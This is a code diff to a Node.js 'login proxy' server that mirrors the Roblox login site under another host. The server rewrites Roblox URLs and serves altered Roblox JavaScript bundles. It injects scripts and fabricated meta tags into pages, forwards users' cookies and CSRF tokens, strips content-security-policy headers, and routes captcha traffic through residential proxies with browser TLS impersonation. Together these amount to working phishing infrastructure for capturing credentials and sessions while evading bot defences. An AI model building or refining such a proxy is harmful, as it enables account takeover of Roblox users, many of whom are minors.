@@ -4,9 +4,27 @@ const https = require('https');
 const http = require('http');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const { spawn, execFile } = require('child_process');
-const vm = require('vm');
+const crypto = require('crypto');
+const path = require('path');
 
 const app = express();
+
+// ─────────────────────────────────────────────────────────────
+// SERVE MODIFIED JS FILES (EnvironmentUrls, CoreUtilities, Challenge, ReactLogin)
+// Place the 4 modified JS files in a /modified-js folder next to index.js
+// ─────────────────────────────────────────────────────────────
+app.use('/js', express.static(path.join(__dirname, 'modified-js')));
+
+// Generate throwaway meta tag values so the modified JS doesn't crash
+// on null when calling getAttribute('value'). Roblox ignores these headers.
+function generateProxyMetaTags() {
+    const sid = crypto.randomBytes(16).toString('hex');
+    const secure = crypto.createHash('md5').update(sid).digest('hex');
+    return `<meta name="proxy" value="${sid}">` +
+           `<meta name="token" value="${sid}">` +
+           `<meta name="secure" value="${secure}">` +
+           `<meta name="meta" value="">`;
+}
 
 console.log('='.repeat(60));
 console.log('🔒 PURE LOGIN PROXY - WITH RESIDENTIAL PROXY FOR ARKOSE');
@@ -1225,188 +1243,9 @@ function rewriteUrls(body, host) {
     result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${cleanHost}`);
     result = result.replace(/\/\/www\.roblox\.com/g, `//${cleanHost}`);
     result = result.replace(/https?:\/\/roblox\.com/g, `https://${cleanHost}`);
-
-    // FIX 3a: Rewrite the hashed EnvironmentUrls CDN script to our custom override route.
-    // The real file contains hardcoded roblox.com hostnames that bypass our fetch interceptor.
-    result = result.replace(
-        /https?:\/\/[^"'\s]+[a-f0-9]{10,}-EnvironmentUrls\.js/g,
-        `https://${cleanHost}/js/EnvironmentUrls.js`
-    );
-    // Also catch the non-hashed variant (e.g. /js/EnvironmentUrls.js on www.roblox.com)
-    result = result.replace(
-        /(src=["'])(?:https?:\/\/[^"'\s]+\/)?EnvironmentUrls\.js(["'])/g,
-        `$1https://${cleanHost}/js/EnvironmentUrls.js$2`
-    );
-
-    // FIX 3b: Remove crossorigin="use-credentials" from the prelude script tag.
-    // Sending credentials cross-origin on that path causes CORS preflight to fail
-    // after it gets re-routed through the proxy.
-    result = result.replace(
-        /(<script[^>]+id="prelude"[^>]*)\s+crossorigin="use-credentials"/g,
-        '$1'
-    );
-
-    // FIX 3c: Rewrite Challenge, ReactLogin, CoreUtilities CDN hashes to /js/ routes
-    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-Challenge\.js/g, `https://${cleanHost}/js/Challenge.js`);
-    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-ReactLogin\.js(\?[^"'\s]*)?/g, `https://${cleanHost}/js/ReactLogin.js?v=1`);
-    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-CoreUtilities\.js/g, `https://${cleanHost}/js/CoreUtilities.js`);
-    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-Challenge\\.js`, "g"), `https://${cleanHost}/js/Challenge.js`);
-    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-ReactLogin\\.js(\\?[^"'\\s]*)?`, "g"), `https://${cleanHost}/js/ReactLogin.js?v=1`);
-    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-CoreUtilities\\.js`, "g"), `https://${cleanHost}/js/CoreUtilities.js`);
-
+    
     return result;
 }
-
-// ─────────────────────────────────────────────────────────────
-// CUSTOM JS FILES — served from GitHub raw
-// These are the competitor's patched bundles that make the
-// challenge flow work correctly through a proxy.
-// ─────────────────────────────────────────────────────────────
-const GITHUB_RAW_BASE = 'https://raw.githubusercontent.com/WeAreDevs-ops/Reverse-proxy/main/js';
-
-const CUSTOM_JS_FILES = {
-    '/js/Challenge.js':      `${GITHUB_RAW_BASE}/Challenge.js`,
-    '/js/ReactLogin.js':     `${GITHUB_RAW_BASE}/ReactLogin.js`,
-    '/js/CoreUtilities.js':  `${GITHUB_RAW_BASE}/CoreUtilities.js`,
-    '/js/EnvironmentUrls.js':`${GITHUB_RAW_BASE}/EnvironmentUrls.js`,
-};
-
-// In-memory cache so we don't hit GitHub on every request
-const jsCache = {};
-
-function fetchRaw(url) {
-    return new Promise((resolve, reject) => {
-        const mod = url.startsWith('https:') ? https : http;
-        mod.get(url, (res) => {
-            // Follow redirects
-            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
-                return fetchRaw(res.headers.location).then(resolve).catch(reject);
-            }
-            if (res.statusCode !== 200) {
-                return reject(new Error(`HTTP ${res.statusCode} for ${url}`));
-            }
-            let data = '';
-            res.on('data', c => data += c);
-            res.on('end', () => resolve(data));
-        }).on('error', reject);
-    });
-}
-
-// Serve each custom JS file from GitHub, cached in memory
-for (const [path, githubUrl] of Object.entries(CUSTOM_JS_FILES)) {
-    app.get(path, async (req, res) => {
-        try {
-            if (!jsCache[path]) {
-                console.log(`[custom-js] Fetching ${path} from GitHub...`);
-                jsCache[path] = await fetchRaw(githubUrl);
-                console.log(`[custom-js] Cached ${path} (${jsCache[path].length} bytes)`);
-            }
-            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-            res.setHeader('Cache-Control', 'public, max-age=300');
-            res.send(jsCache[path]);
-        } catch (err) {
-            console.error(`[custom-js] Failed to serve ${path}:`, err.message);
-            res.status(502).send(`// Failed to load ${path}: ${err.message}`);
-        }
-    });
-}
-
-// ─────────────────────────────────────────────────────────────
-// PRELUDE — The prelude/latest script requires a valid Roblox
-// session cookie to return BAT tokens (401 without it).
-// We let the browser fetch it normally via the rotating-client-service
-// proxy route. The script self-executes in the browser and sets
-// ChefScript.prelude which Challenge.js reads.
-// ─────────────────────────────────────────────────────────────
-async function fetchPreludeBlobs() {
-    // Not fetching server-side — needs user session cookies.
-    // Return empty so HTML injection is skipped cleanly.
-    return null;
-}
-
-// ─────────────────────────────────────────────────────────────
-// FIX 1: Redirect mis-routed prelude script
-// rewriteUrls() turns https://apis.roblox.com → /apis-api, so the
-// prelude <script> ends up at /apis-api/rotating-client-service/...
-// We catch it here and redirect to the correct proxied path.
-// ─────────────────────────────────────────────────────────────
-app.get('/apis-api/rotating-client-service/v1/prelude/latest', (req, res) => {
-    console.log('[prelude] Redirecting mis-routed prelude to correct path');
-    res.redirect(302, '/rotating-client-service/v1/prelude/latest');
-});
-
-// ─────────────────────────────────────────────────────────────
-// FIX 2: Serve a custom EnvironmentUrls.js so Roblox JS reads
-// proxy URLs from the very start, before any fetch interceptor.
-// The competitor does this — serving /js/EnvironmentUrls.js from
-// their own server instead of proxying the real CDN file.
-// ─────────────────────────────────────────────────────────────
-app.get('/js/EnvironmentUrls.js', (req, res) => {
-    const host = (req.headers.host || 'localhost').replace(/^www\./, '');
-    const h = `https://${host}`;
-    console.log(`[EnvironmentUrls] Serving custom EnvironmentUrls.js for host: ${host}`);
-    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-    res.setHeader('Cache-Control', 'no-cache');
-    res.send(`
-(function() {
-    var Roblox = window.Roblox = window.Roblox || {};
-    Roblox.EnvironmentUrls = {
-        apiGatewayUrl:                  "${h}/apis-api",
-        authApi:                        "${h}/auth-api",
-        apiProxyUrl:                    "${h}/api-api",
-        economyApi:                     "${h}/economy-api",
-        usersApi:                       "${h}/users-api",
-        catalogApi:                     "${h}/catalog-api",
-        gamesApi:                       "${h}/games-api",
-        thumbnailsApi:                  "${h}/thumbnails-api",
-        ecsv2Api:                       "${h}/ecsv2-api",
-        contentUrl:                     "${h}/content-cdn",
-        authTokenServiceUrl:            "${h}/auth-token-service",
-        hbaServiceUrl:                  "${h}/hba-service",
-        proofOfWorkServiceUrl:          "${h}/proof-of-work-service",
-        accountSecurityServiceUrl:      "${h}/account-security-service",
-        rotatingClientServiceUrl:       "${h}/rotating-client-service",
-        guacV2Url:                      "${h}/guac-v2",
-        productExperimentationPlatformUrl: "${h}/product-experimentation-platform",
-        otpServiceUrl:                  "${h}/otp-service",
-        challengeUrl:                   "${h}/challenge",
-        captchaUrl:                     "${h}/captcha",
-        abuseUrl:                       "${h}/abuse",
-        clientTelemetryUrl:             "${h}/client-telemetry",
-        ephemeralCountersUrl:           "${h}/ephemeralcounters",
-        metricsUrl:                     "${h}/metrics",
-        localeUrl:                      "${h}/locale",
-        notificationUrl:                "${h}/notification",
-        realtimeUrl:                    "${h}/realtime",
-        presenceUrl:                    "${h}/presence",
-        friendsUrl:                     "${h}/friends",
-        groupsUrl:                      "${h}/groups",
-        inventoryUrl:                   "${h}/inventory",
-        tradesUrl:                      "${h}/trades",
-        billingUrl:                     "${h}/billing",
-        premiumUrl:                     "${h}/premium",
-        badgesUrl:                      "${h}/badges",
-        avatarUrl:                      "${h}/avatar",
-        developUrl:                     "${h}/develop",
-        publishUrl:                     "${h}/publish",
-        voiceUrl:                       "${h}/voice",
-        chatUrl:                        "${h}/chat",
-        privateMessagesUrl:             "${h}/privatemessages",
-        shareUrl:                       "${h}/share",
-        adsUrl:                         "${h}/ads",
-        followingsUrl:                  "${h}/followings",
-        accountSettingsUrl:             "${h}/accountsettings",
-        clientSettingsUrl:              "${h}/clientsettings",
-        clientSettingsCdnUrl:           "${h}/clientsettingscdn",
-        websiteUrl:                     "${h}",
-        wwwUrl:                         "${h}",
-        // Arkose / FunCaptcha
-        captchaProvider:                "ARKOSE_LABS",
-        arkoselabsBaseUrl:              "${h}/arkoselabs-rbxcdn",
-    };
-})();
-`);
-});
 
 app.use((req, res, next) => {
     const start = Date.now();
@@ -1735,65 +1574,7 @@ function createRobloxProxy(prefix, target) {
     });
 }
 
-// ─────────────────────────────────────────────────────────────
-// ROOT-LEVEL API PASS-THROUGH
-// EnvironmentUrls.js sets many APIs to location.origin (the proxy
-// root), so calls like /v1/thumbnails/metadata, /captcha/v1/metadata,
-// /v2/login etc. arrive at the proxy root with no prefix.
-// We map them to the correct Roblox subdomain here.
-// ─────────────────────────────────────────────────────────────
-const ROOT_PASS_THROUGH = [
-    // Path prefix → Roblox target
-    ['/v1/thumbnails',          'https://thumbnails.roblox.com'],
-    ['/v2/thumbnails',          'https://thumbnails.roblox.com'],
-    ['/captcha/v1',             'https://captcha.roblox.com'],
-    ['/v1/users',               'https://users.roblox.com'],
-    ['/v2/users',               'https://users.roblox.com'],
-    ['/v1/friends',             'https://friends.roblox.com'],
-    ['/v1/presence',            'https://presence.roblox.com'],
-    ['/v1/groups',              'https://groups.roblox.com'],
-    ['/v1/catalog',             'https://catalog.roblox.com'],
-    ['/v1/economy',             'https://economy.roblox.com'],
-    ['/v1/games',               'https://games.roblox.com'],
-    ['/v1/badges',              'https://badges.roblox.com'],
-    ['/v1/avatar',              'https://avatar.roblox.com'],
-    ['/universal-app-configuration', 'https://apis.roblox.com'],
-    ['/showcases-api',          'https://apis.roblox.com'],
-    ['/two-step-verification',  'https://twostepverification.roblox.com'],
-];
-
-for (const [prefix, target] of ROOT_PASS_THROUGH) {
-    app.use(prefix, createProxyMiddleware({
-        target,
-        changeOrigin: true,
-        secure: true,
-        proxyTimeout: 30000,
-        timeout: 30000,
-        agent: httpsAgent,
-        on: {
-            proxyReq: (proxyReq, req) => {
-                proxyReq.setHeader('origin', 'https://www.roblox.com');
-                proxyReq.setHeader('referer', 'https://www.roblox.com/');
-                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
-                proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
-                if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
-                if (req.headers['cookie']) proxyReq.setHeader('cookie', req.headers['cookie']);
-            },
-            proxyRes: (proxyRes, req) => {
-                delete proxyRes.headers['content-security-policy'];
-                delete proxyRes.headers['content-security-policy-report-only'];
-                const origin = req.headers['origin'] || `https://${req.headers.host}`;
-                proxyRes.headers['access-control-allow-origin'] = origin;
-                proxyRes.headers['access-control-allow-credentials'] = 'true';
-            },
-            error: (err, req, res) => {
-                if (!res.headersSent) res.status(502).json({ error: 'Proxy error', code: err.code });
-            }
-        }
-    }));
-}
-
-// Register all subdomain-prefixed API proxies
+// Register all API proxies
 // Arkose/funcaptcha/rbxcdn → curl-impersonate (Chrome TLS fingerprint)
 // All other Roblox APIs    → http-proxy-middleware (fast, no fingerprint concern)
 //
@@ -1859,35 +1640,27 @@ app.use('/', createProxyMiddleware({
                 let body = buffer.toString('utf8');
                 body = rewriteUrls(body, host);
 
-                // STEP 1: Rewrite 4 CDN bundles to our custom /js/ routes
-                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-Challenge\.js/g, '/js/Challenge.js');
-                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-ReactLogin\.js(\?[^"']*)?/g, '/js/ReactLogin.js?v=1');
-                body = body.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-CoreUtilities\.js/g, '/js/CoreUtilities.js');
-                // Also catch non-hashed CoreUtilities (proxied via js-cdn)
-                body = body.replace(/https?:\/\/[^"'\s]+\/0eff3f0f1cf697f41279f298df58cc9c047532cec5c3b0035d8236c5386eb8ac-CoreUtilities\.js/g, '/js/CoreUtilities.js');
+                // Redirect the 4 modified JS files to local /modified-js folder
+                body = body.replace(
+                    /https:\/\/[^"']*\/[a-f0-9]+-EnvironmentUrls\.js[^"']*/g,
+                    `https://${host}/js/EnvironmentUrls.js`
+                );
+                body = body.replace(
+                    /https:\/\/[^"']*\/[a-f0-9]+-CoreUtilities\.js[^"']*/g,
+                    `https://${host}/js/CoreUtilities.js`
+                );
+                body = body.replace(
+                    /https:\/\/[^"']*\/[a-f0-9]+-Challenge\.js[^"']*/g,
+                    `https://${host}/js/Challenge.js`
+                );
+                body = body.replace(
+                    /https:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
+                    `https://${host}/js/ReactLogin.js`
+                );
 
-                // STEP 2: Inject BAT meta tags server-side from prelude vm
-                try {
-                    const blobs = await fetchPreludeBlobs();
-                    if (blobs && (blobs.proxyBlob || blobs.tokenBlob || blobs.secureHash)) {
-                        const batMeta = [
-                            `\t<meta name="proxy"  value="${blobs.proxyBlob}">`,
-                            `\t<meta name="token"  value="${blobs.tokenBlob}">`,
-                            `\t<meta name="secure" value="${blobs.secureHash}">`,
-                            `\t<meta name="meta"   value="${blobs.metaVal}">`,
-                        ].join('\n');
-                        body = body.replace('</head>', batMeta + '\n</head>');
-                        console.log('[prelude-vm] ✅ Injected BAT meta tags into HTML');
-                    } else {
-                        console.warn('[prelude-vm] ⚠️  No BAT blobs — meta tags skipped');
-                    }
-                } catch (err) {
-                    console.error('[prelude-vm] ❌ Meta injection failed:', err.message);
-                }
-
-                // STEP 3: Inject URL-rewrite + challenge interceptor script
                 const script = buildInjectedScript(host);
-                body = body.replace('<head', `<head>${script}`);
+                const metaTags = generateProxyMetaTags();
+                body = body.replace('<head', `<head>${metaTags}${script}`);
                 return body;
             }
             return buffer;
